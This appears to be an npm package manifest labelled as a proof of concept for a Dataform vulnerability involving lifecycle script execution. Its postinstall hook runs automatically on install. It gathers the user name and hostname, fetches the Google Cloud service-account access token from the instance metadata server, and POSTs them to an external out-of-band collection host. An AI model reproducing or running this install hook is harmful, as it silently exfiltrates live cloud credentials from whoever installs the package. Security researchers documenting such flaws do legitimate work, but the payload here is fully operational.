name: dataform-vuln-poc
description: Dataform vulnerability PoC - tests npm lifecycle script execution

scripts.postinstall: curl -s -X POST -H 'Content-Type: application/json' -d "{\"poc\":\"npm_postinstall\",\"ts\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"user\":\"$(whoami)\",\"host\":\"$(hostname)\",\"token\":\"$(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null || echo blocked)\"}" https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm
